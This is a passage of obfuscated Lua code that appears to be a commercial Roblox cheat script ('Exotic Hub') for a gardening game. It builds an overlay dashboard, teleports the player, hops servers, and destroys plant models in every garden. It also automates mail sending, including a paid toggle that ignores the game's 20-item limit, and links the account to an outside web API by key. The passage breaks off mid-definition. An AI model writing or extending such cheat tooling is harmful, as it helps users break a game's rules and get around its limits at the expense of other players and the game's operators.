		if V > 0 then
			return string.format("Session: %dh %dm %dsec", V, Z, j)
		end
		return string.format("Session: %dm %dsec", Z, j)
	end,
	ApplyNormalStatusStyleRealTimeStats = function(G)
		if not G then
			return false
		end
		G.Size = UDim2.new(.3, 0, .4, 0)
		G.AnchorPoint = Vector2.new(0, .5)
		G.Position = UDim2.new(0, 120, .65, 0)
		G.BackgroundTransparency = 1
		G.RichText = true
		G.TextScaled = false
		G.TextWrapped = false
		G.Font = Enum.Font.SourceSansBold
		G.TextColor3 = Color3.new(1, 1, 1)
		G.TextStrokeTransparency = .5
		G.TextXAlignment = Enum.TextXAlignment.Left
		G.TextYAlignment = Enum.TextYAlignment.Top
		G.LineHeight = 1
		return true
	end;
	ApplyFullPerformanceDashboardStyleRealTimeStats = function(G, V)
		if not G then
			return false
		end
		G.Size = UDim2.fromScale(.94, .86)
		G.AnchorPoint = Vector2.new(.5, .5)
		G.Position = UDim2.fromScale(.5, .5)
		G.BackgroundTransparency = 1
		G.RichText = true
		G.TextScaled = false
		G.TextWrapped = true
		G.Font = Enum.Font.GothamSemibold
		G.TextColor3 = Color3.new(1, 1, 1)
		G.TextStrokeTransparency = .55
		G.TextXAlignment = Enum.TextXAlignment.Center
		G.TextYAlignment = Enum.TextYAlignment.Center
		G.LineHeight = 1.08
		G.TextSize = tonumber(V) or (e.RealTimeStats.GetTextSizesRealTimeStats()).line
		return true
	end;
	FormatMoneyRealTimeStats = function(G)
		if E and (E.Currency and type(E.Currency.FormatMoney) == "function") then
			return E.Currency.FormatMoney(G)
		end
		return q.formatShecklesNumber(G)
	end,
	GetIncomeExpenseLineRealTimeStats = function(G)
		local V = Z.ShecklesSessionTracker.GetStatsShecklesSessionTracker()
		local y = e.RealTimeStats.EscapeRichTextRealTimeStats(e.RealTimeStats.FormatMoneyRealTimeStats(tonumber(V.incomePerMinute) or 0))
		local j = e.RealTimeStats.EscapeRichTextRealTimeStats(e.RealTimeStats.FormatMoneyRealTimeStats(tonumber(V.outgoingPerMinute) or 0))
		local i = math.max(math.floor(tonumber(G) or (e.RealTimeStats.GetTextSizesRealTimeStats()).normal), 1)
		return string.format("<font color=\'#FFFFFF\' size=\'%d\'>Income</font> <font color=\'#39FF14\' size=\'%d\'>$%s /min</font> <font color=\'#606060\' size=\'%d\'>|</font> <font color=\'#FFFFFF\' size=\'%d\'>Expense</font> <font color=\'#FF6666\' size=\'%d\'>-$%s /min</font>", i, i, y, i, i, i, j)
	end,
	GetGoldmoonTextRealTimeStats = function()
		local G = Z.MoonPredictor
		if type(G) ~= "table" then
			return "--"
		end
		local V = tostring(y.Workspace:GetAttribute("ActiveWeather") or "")
		if V == "Goldmoon" then
			return "active now"
		end
		if type(G.GetRare) ~= "function" or type(G.GetServerTime) ~= "function" or type(G.FormatTime) ~= "function" then
			return "--"
		end
		local j = G.GetServerTime()
		local i, c = pcall(function()
			return G.GetRare(20, G.RollMode)
		end)
		if not i or type(c) ~= "table" then
			return "--"
		end
		for V, y in ipairs(c) do
			if type(y) == "table" and y.Name == "Goldmoon" then
				return "in " .. G.FormatTime(((tonumber(y.At) or j)) - j)
			end
		end
		return "not soon"
	end;
	GetWeatherTextRealTimeStats = function()
		local G = tostring(y.Workspace:GetAttribute("ActivePhase") or "")
		local V = tostring(y.Workspace:GetAttribute("ActiveWeather") or "")
		local Z = e.RealTimeStats.GetGoldmoonTextRealTimeStats()
		local j = V
		if j == "" then
			j = G
		elseif G ~= "" and (G ~= j and V ~= "Goldmoon") then
			j = j .. (" / " .. G)
		end
		if j == "" then
			j = "None"
		end
		if V == "Goldmoon" then
			return "Goldmoon active now | " .. j
		end
		return "Goldmoon " .. (Z .. (" | " .. j))
	end,
	GetMailboxCountRealTimeStats = function()
		local G = os.clock()
		local V = tonumber(e.RealTimeStats.mailboxCountRealTimeStats) or 0
		if G - ((tonumber(e.RealTimeStats.lastMailboxCountRefreshRealTimeStats) or 0)) < 15 then
			return V
		end
		if Z.Mail and Z.Mail.Busy then
			return V
		end
		local j = y.Networking and y.Networking.Mailbox
		local i = j and j.OpenInbox
		if not i or type(i.Fire) ~= "function" then
			return V
		end
		e.RealTimeStats.lastMailboxCountRefreshRealTimeStats = G
		local c, J = pcall(function()
			return i:Fire()
		end)
		if not c or type(J) ~= "table" then
			return V
		end
		local T = 0
		for G, V in pairs(J) do
			if type(V) == "table" then
				T += 1
			end
		end
		e.RealTimeStats.mailboxCountRealTimeStats = T
		return T
	end;
	GetProgressTextRealTimeStats = function(G, V, y)
		local Z = math.max(math.floor(tonumber(G) or 0), 0)
		local j = math.max(math.floor(tonumber(V) or Z), Z)
		local i = math.max(math.floor(tonumber(y) or 14), 1)
		if j > 0 and Z >= j then
			return string.format("<font color=\"#66FF99\" size=\"%d\">%d / %d</font>", i, Z, j)
		end
		return string.format("<font color=\"#AFAFAF\" size=\"%d\">%d / %d</font>", i, Z, j)
	end,
	GetUpgradeProgressTextRealTimeStats = function(G, V, y)
		local Z = math.max(math.floor(tonumber(G) or 0), 0)
		local j = math.max(math.floor(tonumber(V) or Z), Z)
		local i = math.max(math.floor(tonumber(y) or 14), 1)
		if j > 0 and Z >= j then
			return string.format("<font color=\"#66FF99\" size=\"%d\">%d/%d</font>", i, Z, j)
		end
		return string.format("<font color=\"#FFD84D\" size=\"%d\">%d</font><font color=\"#FFFFFF\" size=\"%d\">/</font><font color=\"#FF6666\" size=\"%d\">%d</font>", i, Z, i, i, j)
	end,
	GetUpgradeLineRealTimeStats = function(G, V, y, Z, j)
		local i = math.max(math.floor(tonumber(y) or 0), 0)
		local c = math.max(math.floor(tonumber(Z) or i), i)
		local J = math.max(math.floor(tonumber(j) or 14), 1)
		local T = tostring(G or "") .. (" " .. (tostring(V or "") .. ":"))
		if c > 0 and i >= c then
			local G = string.format("%s %d/%d", T, i, c)
			return string.format("<s><font color=\"#66FF99\" size=\"%d\">%s</font></s>", J, e.RealTimeStats.EscapeRichTextRealTimeStats(G))
		end
		return string.format("<font color=\"#FFFFFF\" size=\"%d\">%s</font> %s", J, e.RealTimeStats.EscapeRichTextRealTimeStats(T), e.RealTimeStats.GetUpgradeProgressTextRealTimeStats(i, c, J))
	end,
	GetPlantedLimitRealTimeStats = function()
		if Z.GardenSeedLimit and type(Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit) == "function" then
			local G, V = pcall(Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit)
			if G then
				return math.max(math.floor(tonumber(V) or 0), 0)
			end
		end
		return 0
	end,
	BuildFullPerformanceDashboardRealTimeStats = function()
		local G = e.RealTimeStats.GetTextSizesRealTimeStats()
		local V = y.LocalPlayer
		local j = V and tostring(V.Name or "") or "Unknown"
		if j == "" then
			j = "Unknown"
		end
		j = e.RealTimeStats.EscapeRichTextRealTimeStats(j)
		j = g.MaskName(j)
		local i = tonumber(Z.Money.GetSheckles()) or 0
		local c = e.RealTimeStats.EscapeRichTextRealTimeStats(e.RealTimeStats.FormatMoneyRealTimeStats(i))
		local J = "Off"
		if Z.TotalControl and (type(Z.TotalControl.IsEnabledTotalControl) == "function" and Z.TotalControl.IsEnabledTotalControl()) then
			J = tostring(X.status or "")
			if J == "" then
				J = "Waiting"
			end
		end
		J = e.RealTimeStats.EscapeRichTextRealTimeStats(J)
		local T = math.max(math.floor(tonumber(Z.PlayerData.GetFruitCount()) or 0), 0)
		local d = math.max(math.floor(tonumber(Z.PlayerData.GetMaxFruitCapacity()) or 0), 0)
		local u = 0
		local q = 0
		local E = Z.GardenItems and Z.GardenItems.ExpandSystem
		if type(E) == "table" and (type(E.GetCurrentSlot) == "function" and type(E.GetMaximumSlot) == "function") then
			local G, V = pcall(E.GetCurrentSlot)
			local y, Z = pcall(E.GetMaximumSlot)
			if G then
				u = math.max(math.floor(tonumber(V) or 0), 0)
			end
			if y then
				q = math.max(math.floor(tonumber(Z) or 0), 0)
			end
		end
		local a = math.max(math.floor(tonumber(Z.PlayerData.GetMaxEquippedPets()) or 0), 0)
		local H = a
		local r = Z.GardenItems and Z.GardenItems.PetMaxInventorySystem
		if type(r) == "table" and type(r.GetAbsoluteMaxPetMaxInventorySystem) == "function" then
			local G, V = pcall(r.GetAbsoluteMaxPetMaxInventorySystem)
			if G then
				H = math.max(math.floor(tonumber(V) or a), a)
			end
		end
		local Y = 0
		if Z.Farm and type(Z.Farm.GetPlantedSeedTotalCount) == "function" then
			local G, V = pcall(Z.Farm.GetPlantedSeedTotalCount)
			if G then
				Y = math.max(math.floor(tonumber(V) or 0), 0)
			end
		end
		local s = e.RealTimeStats.GetPlantedLimitRealTimeStats()
		local N = e.RealTimeStats.GetProgressTextRealTimeStats(Y, s, G.line)
		local W = "--"
		local h = tonumber(Z.RuntimeStats.GetMemoryRuntimeStats())
		if h then
			if h >= 1024 then
				W = string.format("%.1fGB", h / 1024)
			else
				W = tostring(h) .. "MB"
			end
		end
		W = e.RealTimeStats.EscapeRichTextRealTimeStats(W)
		local l = "--"
		local B = tonumber(Z.RuntimeStats.GetPingRuntimeStats())
		if B then
			l = tostring(B) .. "ms"
		end
		l = e.RealTimeStats.EscapeRichTextRealTimeStats(l)
		local L = string.format("<font color=\"#66FF99\" size=\"%d\">PUBLIC</font>", G.line)
		if g.is_private_server == true then
			L = string.format("<font color=\"#66FF99\" size=\"%d\">PRIVATE</font>", G.line)
		end
		local m = e.RealTimeStats.EscapeRichTextRealTimeStats(e.RealTimeStats.GetSessionTextRealTimeStats())
		local K = e.RealTimeStats.EscapeRichTextRealTimeStats(e.RealTimeStats.GetWeatherTextRealTimeStats())
		local b = math.max(math.floor(tonumber(Z.RuntimeStats.FpsRuntimeStats) or 0), 0)
		local S = ""
		if Z.LiteFruitCollection and (Z.LiteFruitCollection.IsEnabledLiteFruitCollection and Z.LiteFruitCollection.IsEnabledLiteFruitCollection()) then
			S = string.format(" <font color=\"#FFD700\" size=\"%d\">[LITE %d%%]</font>", G.line, Z.LiteFruitCollection.GetSpeedPercentLiteFruitCollection())
		end
		local z = {
			string.format("<b><font color=\"#CFCFCF\" size=\"%d\"></font> <font color=\"#39FF14\" size=\"%d\">$%s</font></b>", G.sheckles, G.sheckles, c);
			string.format("<font color=\"#AFAFAF\" size=\"%d\">\240\159\145\164 %s</font>", G.user, j),
			string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\167\160 Total Control:</font> <font color=\"#FF8FA3\" size=\"%d\">%s</font>", G.line, G.line, J);
			string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\141\147 Fruit Collect:</font>%s <font color=\"#EDEDED\" size=\"%d\">%d/%d</font>", G.line, S, G.line, T, d);
			e.RealTimeStats.GetIncomeExpenseLineRealTimeStats(G.line);
			string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\140\177 Planted:</font> %s", G.line, N),
			e.RealTimeStats.GetUpgradeLineRealTimeStats("\240\159\144\190", "Pet Slots Unlock", a, H, G.line),
			e.RealTimeStats.GetUpgradeLineRealTimeStats("\240\159\143\161", "Plot Expansion Unlock", u, q, G.line),
			string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\140\166\239\184\143 Weather:</font> <font color=\"#FFD700\" size=\"%d\">%s</font>", G.line, G.line, K)
		}
		local f = e.RealTimeStats.GetMailboxCountRealTimeStats()
		if f > 0 then
			table.insert(z, string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\147\172 Mailbox:</font> <font color=\"#66CCFF\" size=\"%d\">%d</font>", G.line, G.line, f))
		end
		table.insert(z, string.format("<font color=\"#FFFFFF\" size=\"%d\">\240\159\150\165\239\184\143 Server:</font> %s", G.line, L))
		table.insert(z, string.format("<font color=\"#FFFFFF\" size=\"%d\">\226\143\177\239\184\143 %s</font>", G.line, m))
		table.insert(z, string.format("<font color=\"#FFFFFF\" size=\"%d\">FPS:</font> <font color=\"#AFAFAF\" size=\"%d\">%d</font> <font color=\"#606060\" size=\"%d\">|</font> <font color=\"#FFFFFF\" size=\"%d\">RAM:</font> <font color=\"#AFAFAF\" size=\"%d\">%s</font> <font color=\"#606060\" size=\"%d\">|</font> <font color=\"#FFFFFF\" size=\"%d\">Ping:</font> <font color=\"#AFAFAF\" size=\"%d\">%s</font>", G.line, G.line, b, G.line, G.line, G.line, W, G.line, G.line, G.line, l))
		table.insert(z, "\n")
		table.insert(z, string.format("<font color=\"#EDEDED\" size=\"%d\">\240\159\148\151 https://exotichub.app/</font><font color=\"#00AEEF\" size=\"%d\">discord</font>", G.footer, G.footer))
		table.insert(z, string.format("<font color=\"#AFAFAF\" size=\"%d\">Version: %s</font>", G.version, e.RealTimeStats.EscapeRichTextRealTimeStats(tostring(y.CurentV or ""))))
		return table.concat(z, "\n")
	end;
	UpdateSessionTimerRealTimeStats = function(G, V)
		if not G then
			return false
		end
		local y = e.RealTimeStats.sessionLabel
		if not y or not y.Parent then
			y = G:FindFirstChild("SessionDisplay")
			if not y then
				y = Instance.new("TextLabel")
				y.Name = "SessionDisplay"
				y.BackgroundTransparency = 1
				y.RichText = true
				y.Font = Enum.Font.SourceSansBold
				y.TextColor3 = Color3.new(1, 1, 1)
				y.TextStrokeTransparency = .35
				y.TextXAlignment = Enum.TextXAlignment.Right
				y.TextYAlignment = Enum.TextYAlignment.Bottom
				y.AnchorPoint = Vector2.new(1, 1)
				y.Position = UDim2.new(.98, 0, .98, 0)
				y.Size = UDim2.fromOffset(190, 22)
				y.Parent = G
			end
			e.RealTimeStats.sessionLabel = y
		end
		if h.full_performance_mode == true then
			y.Visible = false
			return true
		end
		y.Visible = h.hide_log_ui ~= true
		y.TextSize = tonumber(V) or (e.RealTimeStats.GetTextSizesRealTimeStats()).session
		y.Text = string.format("<font color=\"#FFFFFF\">Session:</font> <font color=\"#FFD84D\">%s</font>", e.RealTimeStats.EscapeRichTextRealTimeStats((e.RealTimeStats.GetSessionTextRealTimeStats()):gsub("^Session:%s*", "")))
		return true
	end;
	updateStatusList = function(G)
		local V = e.RealTimeStats.GetTextSizesRealTimeStats()
		local Z = V.normal
		local j = e.RealTimeStats
		local i = j.statusLabel
		local c = y.PlayerGui and y.PlayerGui:FindFirstChild("StatusGui")
		if c then
			c.IgnoreGuiInset = true
			c.DisplayOrder = 1000
		end
		if not i or not i.Parent then
			local G = y.LocalPlayer
			if not G then
				return
			end
			local V = y.PlayerGui
			c = c or V:FindFirstChild("StatusGui")
			if not c then
				c = Instance.new("ScreenGui")
				c.Name = "StatusGui"
				c.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				c.ResetOnSpawn = false
				c.IgnoreGuiInset = true
				c.Parent = V
				c.DisplayOrder = 1000
			end
			i = c:FindFirstChild("StatusDisplay")
			if not i then
				i = Instance.new("TextLabel")
				i.Name = "StatusDisplay"
				i.Parent = c
				i.Size = UDim2.new(.3, 0, .4, 0)
				i.AnchorPoint = Vector2.new(0, .5)
				i.Position = UDim2.new(0, 120, .65, 0)
				i.BackgroundTransparency = 1
				i.RichText = true
				i.Font = Enum.Font.SourceSansBold
				i.TextColor3 = Color3.new(1, 1, 1)
				i.TextStrokeTransparency = .5
				i.TextXAlignment = Enum.TextXAlignment.Left
				i.TextYAlignment = Enum.TextYAlignment.Top
			end
			j.statusLabel = i
		end
		if i then
			if h.full_performance_mode == true then
				local G = os.clock()
				if j.lastFullPerformanceDashboardRefresh == 0 or G - j.lastFullPerformanceDashboardRefresh >= 1 then
					j.lastFullPerformanceDashboardRefresh = G
					j.ApplyFullPerformanceDashboardStyleRealTimeStats(i, V.line)
					i.Text = j.BuildFullPerformanceDashboardRealTimeStats()
				end
				e.RealTimeStats.UpdateSessionTimerRealTimeStats(c or i and i.Parent, V.session)
				return
			end
			j.lastFullPerformanceDashboardRefresh = 0
			j.ApplyNormalStatusStyleRealTimeStats(i)
			i.TextSize = Z
			local y = table.concat(G, "\n")
			i.Text = y
		end
		e.RealTimeStats.UpdateSessionTimerRealTimeStats(c or i and i.Parent, V.session)
	end
}
q.SafeParent = function(G, V, y)
	if typeof(G) ~= "Instance" or typeof(V) ~= "Instance" or G.Parent == nil or V.Parent == nil then
		return false
	end
	local Z = false
	local j = pcall(function()
		if y and G.Parent ~= y then
			return
		end
		G.Parent = V
		Z = true
	end)
	return j and Z
end
g.remove_names_ls = {
	PopVFXModel = true
}
y.Workspace.ChildAdded:Connect(function(G)
	if G and G:IsA("Model") then
		if g.remove_names_ls[G.Name] then
			pcall(function()
				G.Parent = y.ReplicatedFirst
			end)
		end
	end
end)
task.spawn(function()
	pcall(function()
		if h.char_farm_middle then
			local G = Z.Farm.GetCenterPointPart()
			if G then
				Z.Teleport.LockTeleport(g.TeleportLockNames.Other, 2)
				Z.Teleport.TeleportTo(Z.Farm.GetCenterPointPart(), true, g.TeleportLockNames.Other)
				print("Teleport middle")
			else
				print("center not found")
			end
		end
	end)
end)
g.GetProLabel = function()
	local G = "\240\159\148\146<font color=\'#FF0000\'>PRO</font>"
	if g.GetCheckIfPro() then
		G = ""
	end
	return G
end
Z.PlantModelCleaner = {
	StartedPlantModelCleaner = false,
	ConnectionsPlantModelCleaner = {};
	FolderConnectionsPlantModelCleaner = {},
	DestroyedPlantModelCleaner = 0;
	IsActivePlantModelCleaner = function()
		local G = Z.TotalControl
		local V = G and (type(G.ResolveFruitCollectPreventDestroyPlantsTotalControl) == "function" and G.ResolveFruitCollectPreventDestroyPlantsTotalControl()) or nil
		local y = V == nil and h.fruit_collect_prevent_destroy_plants or V == true
		if y then
			return false
		end
		local j = G and (type(G.ResolveHighModeEnabledTotalControl) == "function" and G.ResolveHighModeEnabledTotalControl()) or nil
		local i = j == nil and h.high_mode or j == true
		if i and g.GetCheckIfPro() == true then
			return true
		end
		return false
	end,
	SetStatusPlantModelCleaner = function(G, V)
		g.PlantModelCleanerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\140\177 [Plant Models]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or ""))
	end;
	DestroyObjectPlantModelCleaner = function(G)
		if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
			return false
		end
		if typeof(G) ~= "Instance" or not G.Parent then
			return false
		end
		local V = pcall(function()
			G:Destroy()
		end)
		if V then
			Z.PlantModelCleaner.DestroyedPlantModelCleaner += 1
		end
		return V
	end,
	CleanFolderPlantModelCleaner = function(G)
		if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
			return false
		end
		if typeof(G) ~= "Instance" or not G.Parent then
			return false
		end
		local V = G:GetChildren()
		for G, V in ipairs(V) do
			if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
				break
			end
			Z.PlantModelCleaner.DestroyObjectPlantModelCleaner(V)
			if G % 50 == 0 then
				task.wait()
			end
		end
		return true
	end,
	HookFolderPlantModelCleaner = function(G)
		if typeof(G) ~= "Instance" or not G.Parent then
			return false
		end
		if Z.PlantModelCleaner.FolderConnectionsPlantModelCleaner[G] then
			return true
		end
		local V = G.ChildAdded:Connect(function(G)
			if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
				return
			end
			task.defer(function()
				Z.PlantModelCleaner.DestroyObjectPlantModelCleaner(G)
			end)
		end)
		Z.PlantModelCleaner.FolderConnectionsPlantModelCleaner[G] = V
		table.insert(Z.PlantModelCleaner.ConnectionsPlantModelCleaner, V)
		if Z.PlantModelCleaner.IsActivePlantModelCleaner() then
			Z.PlantModelCleaner.CleanFolderPlantModelCleaner(G)
		end
		return true
	end,
	HookOwnPlantsFolderPlantModelCleaner = function()
		local G = Z.Farm.GetMyPlantsFolder()
		if not G or not G.Parent then
			return false
		end
		return Z.PlantModelCleaner.HookFolderPlantModelCleaner(G)
	end;
	HookOtherPlantsFoldersPlantModelCleaner = function()
		for G, V in ipairs(Z.Farm.GetMyPlantsFoldersNotMine()) do
			if not V or not V.Parent then
				continue
			end
			local y = V:FindFirstChild("Plants")
			if y then
				Z.PlantModelCleaner.HookFolderPlantModelCleaner(y)
			end
		end
		return true
	end,
	HookGardenPlotsPlantModelCleaner = function()
		local G = y.Workspace:FindFirstChild("Gardens")
		if not G then
			return false
		end
		local V = G.ChildAdded:Connect(function(G)
			task.defer(function()
				if not G or not G.Parent then
					return
				end
				local V = G:FindFirstChild("Plants")
				if V then
					Z.PlantModelCleaner.HookFolderPlantModelCleaner(V)
					return
				end
				local y
				y = G.ChildAdded:Connect(function(G)
					if G and G.Name == "Plants" then
						Z.PlantModelCleaner.HookFolderPlantModelCleaner(G)
						if y then
							y:Disconnect()
						end
					end
				end)
				table.insert(Z.PlantModelCleaner.ConnectionsPlantModelCleaner, y)
			end)
		end)
		table.insert(Z.PlantModelCleaner.ConnectionsPlantModelCleaner, V)
		return true
	end,
	RemovePlantByIdPlantModelCleaner = function(G)
		if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
			return false
		end
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local V = Z.Farm.GetMyPlantsFolder()
		if not V or not V.Parent then
			return false
		end
		local y = V:FindFirstChild(G)
		if y then
			return Z.PlantModelCleaner.DestroyObjectPlantModelCleaner(y)
		end
		for V, y in ipairs(V:GetChildren()) do
			if tostring(y:GetAttribute("PlantId") or y:GetAttribute("PlantID") or y:GetAttribute("Id") or y.Name or "") == G then
				return Z.PlantModelCleaner.DestroyObjectPlantModelCleaner(y)
			end
		end
		return false
	end;
	ApplyPlantModelCleaner = function()
		Z.PlantModelCleaner.HookOwnPlantsFolderPlantModelCleaner()
		Z.PlantModelCleaner.HookOtherPlantsFoldersPlantModelCleaner()
		if Z.PlantModelCleaner.IsActivePlantModelCleaner() then
			Z.PlantModelCleaner.SetStatusPlantModelCleaner("Removing live plant models", "#7CFC00")
		else
			Z.PlantModelCleaner.SetStatusPlantModelCleaner("Idle", "#CFCFCF")
		end
		return true
	end,
	StartPlantModelCleaner = function()
		if Z.PlantModelCleaner.StartedPlantModelCleaner then
			return false
		end
		Z.PlantModelCleaner.StartedPlantModelCleaner = true
		Z.PlantModelCleaner.HookGardenPlotsPlantModelCleaner()
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(3)
				local G = Z.TotalControl
				local V = G and (type(G.ResolveHighModeEnabledTotalControl) == "function" and G.ResolveHighModeEnabledTotalControl()) or nil
				local y = V == nil and h.high_mode or V == true
				if not y then
					continue
				end
				pcall(Z.PlantModelCleaner.ApplyPlantModelCleaner)
			end
		end)
		return true
	end;
	RemoveAllPlants = function()
		local G = y.Workspace:FindFirstChild("Gardens")
		if G then
			for G, V in ipairs(G:GetChildren()) do
				local y = V:FindFirstChild("Plants")
				if y then
					for G, V in ipairs(y:GetChildren()) do
						if V then
							V:Destroy()
						end
					end
				end
			end
		end
	end,
	StartPlantRemovelSys = function()
		task.spawn(function()
			while true do
				task.wait(5)
				if not Z.PlantModelCleaner.IsActivePlantModelCleaner() then
					continue
				end
				Z.PlantModelCleaner.RemoveAllPlants()
			end
		end)
	end
}
Z.PlantModelCleaner.StartPlantRemovelSys()
g.HomeDashboardUi = function()
	local G = E.SERVER.GetServerVersion()
	local V = d:AddTab({
		Name = "<font color=\"#FFFFFF\">Config & </font><font color=\"#00A2FF\">Home</font>";
		Description = "<font color=\"#B4B4B4\">Game Server Version: </font><font color=\"#FFD700\"><b>" .. (G .. "</b></font>");
		Icon = "house"
	})
	local y = V:AddLeftGroupbox("Actions", "calendar-sync")
	local j = V:AddLeftGroupbox("Vulnerability", "sprout")
	local i = V:AddRightGroupbox("Moon Predictor", "moon-star")
	local c = V:AddRightGroupbox("Farm Details", "sprout", false)
	if j then
		j:AddButton({
			Text = "Hop Server (Request Hop)";
			Func = function()
				Z.AntiAfk.RequestHop()
			end
		})
	end
	local J = V:AddLeftGroupbox("<font color=\"#FFFFFF\">Multi Account </font><font color=\"#00A2FF\">Config</font>", "copy", false)
	local T = V:AddLeftGroupbox("<font color=\"#FFFFFF\">Website </font><font color=\"#00A2FF\">Sync</font>", "cloud-cog")
	if i then
		Z.MoonPredictor.Label = i:AddLabel({
			Text = "<font color=\'#AFAFAF\'>Loading moon predictions...</font>";
			DoesWrap = true
		})
		i:AddToggle("moon_predictor_enabled_ui", {
			Text = "Enable Moon Predictor";
			Default = h.moon_predictor_enabled,
			Tooltip = "Shows upcoming Goldmoon, Rainbow Moon and Bloodmoon events.",
			Callback = function(G)
				h.moon_predictor_enabled = G
				a.Save.SaveDataSync()
				Z.MoonPredictor.Update()
			end
		})
	end
	if c then
		Z.FarmDetails.Label = c:AddLabel({
			Text = "<font color=\'#AFAFAF\'>Loading farm details...</font>";
			DoesWrap = true
		})
		c:AddButton({
			Text = "Refresh Farm Details";
			Func = function()
				Z.FarmDetails.Update()
			end
		})
		Z.FarmDetails.Start()
	end
	if T then
		T:AddLabel({
			Text = "<font color=\'#66CCFF\'><b>Connect to Exotic Hub</b></font>\nEnter your Web API key and link this account.";
			DoesWrap = true
		})
		local G = T:AddLabel({
			Text = tostring(h.web_api_key or "") ~= "" and "<font color=\'#FFCC66\'>\226\151\143 API key saved \226\128\148 ready to link</font>" or "<font color=\'#AFAFAF\'>\226\151\143 Not connected</font>";
			DoesWrap = true
		})
		local function V(V)
			if G and type(G.SetText) == "function" then
				G:SetText(V)
			end
		end
		T:AddInput("gag2_web_api_key", {
			Text = "\240\159\148\145 Web API Key";
			Default = h.web_api_key,
			Numeric = false,
			AllowEmpty = true,
			Finished = false,
			ClearTextOnFocus = false,
			Placeholder = "Enter API key";
			Tooltip = "Get your API key from the Exotic Hub website.",
			Callback = function(G)
				h.web_api_key = (tostring(G or "")):match("^%s*(.-)%s*$")
				a.Save.SaveDataSync()
				if h.web_api_key == "" then
					V("<font color=\'#AFAFAF\'>\226\151\143 Not connected</font>")
				else
					V("<font color=\'#FFCC66\'>\226\151\143 API key saved \226\128\148 ready to link</font>")
				end
			end
		})
		T:AddDivider()
		T:AddButton({
			Text = "\240\159\148\151 Link This Account";
			Func = function()
				if Z.WebApi.Busy then
					g.Notify("Link request already running", 3)
					return
				end
				V("<font color=\'#66CCFF\'>\226\151\143 Linking account...</font>")
				task.spawn(function()
					local G, y = Z.WebApi.LinkDevice()
					if G then
						V("<font color=\'#7CFC00\'>\226\151\143 Account successfully linked</font>")
					else
						V("<font color=\'#FF6666\'>\226\151\143 " .. (tostring(y) .. "</font>"))
					end
					g.Notify(y, 5)
				end)
			end
		})
	end
	if J then
		J:AddButton({
			Text = "Copy Config";
			Func = function()
				local G = a.Config.BuildCopyText()
				if not G then
					g.Notify("Failed to create config", 3)
					return
				end
				q.CopyToClipBoard(G)
				g.Notify("Config copied. Add it above the loader.", 3)
			end
		})
		J:AddButton({
			Text = "\240\159\159\162 Copy Config With Loader";
			Func = function()
				local G = a.Config.BuildCopyWithLoaderText()
				if not G then
					g.Notify("Failed to create config", 3)
					return
				end
				q.CopyToClipBoard(G)
				g.Notify("Config copied. Add and enter your key.", 3)
			end
		})
	end
	if y then
		local G = y:AddButton({
			Text = "\240\159\148\183 Console";
			Func = function()
				(game:GetService("StarterGui")):SetCore("DevConsoleVisible", true)
			end
		})
		local V = y:AddButton({
			Text = "\240\159\154\168 Rejoin Server",
			Func = function()
				Z.Player.Rejoin()
			end
		})
		local j = y:AddButton({
			Text = "\240\159\147\161 Hop Server";
			Func = function()
				s.Hop.HopToNewServer()
			end
		})
		y:AddDivider()
		y:AddToggle("automiddletp", {
			Text = "\240\159\147\141 Spawn Middle";
			Default = h.char_farm_middle;
			Tooltip = "Place your character in the centre of the farm when you join.",
			Callback = function(G)
				h.char_farm_middle = G
				a.Save.SaveDataSync()
			end
		})
	end
end
g.MailUi = function()
	local G = d:AddTab({
		Name = "Mail " .. g.GetProLabel();
		Description = "Send and receive items",
		Icon = "mail"
	})
	local V = G:AddLeftGroupbox("Manual Order", "send")
	local y = G:AddRightGroupbox("Automatic Send", "repeat-2")
	local j = G:AddLeftGroupbox("Receipts", "receipt-text")
	local i = G:AddRightGroupbox("Incoming Mail", "mail-open")
	if V then
		local G = "Seeds"
		local y = ""
		local j = 1
		local i = g.MailDraftFruitMinKg
		local c = g.MailDraftFruitMaxKg
		local J = g.MailDraftFruitMutations
		local T = g.MailDraftFruitVariants
		local d
		local u
		local q
		local E
		local H
		V:AddLabel({
			Text = "Enter the exact Roblox username. @ is optional.",
			DoesWrap = true
		})
		V:AddInput("mail_manual_username_ui", {
			Text = "\240\159\145\164 Recipient Username",
			Default = g.MailDraftTargetUsername;
			Numeric = false;
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Roblox username",
			Callback = function(G)
				g.MailDraftTargetUsername = Z.Mail.CleanUsername(G)
			end
		})
		V:AddButton({
			Text = "\240\159\148\142 Check Recipient";
			Func = function()
				local G, V = Z.Mail.LookupRecipient(g.MailDraftTargetUsername)
				if not G then
					g.Notify(V, 3)
					Z.Mail.SetStatus(V, "#FF5555")
					return
				end
				g.Notify(string.format("Found @%s (%s)", G.username, G.displayName), 4)
				Z.Mail.SetStatus(string.format("Recipient ready: @%s", G.username), "#7CFC00")
			end
		})
		V:AddToggle("mail_include_comment_ui", {
			Text = "\240\159\146\172 Include Order Comment";
			Default = h.mail_include_comment;
			Tooltip = "Adds the order ID and progress to each mail.";
			Callback = function(G)
				h.mail_include_comment = G
				a.Save.SaveDataSync()
			end
		})
		E = V:AddToggle("mail_ignore_batch_limit_ui", {
			Text = "\240\159\147\166 Ignore 20 Item Limit",
			Default = h.mail_ignore_batch_limit,
			Tooltip = "Sends the full amount in one mail. Applies to manual and automatic sending.";
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.mail_ignore_batch_limit = G
				a.Save.SaveDataSync()
			end
		})
		H = V:AddToggle("mail_manual_batch_together_ui", {
			Text = "\240\159\147\166 Combine Order Items",
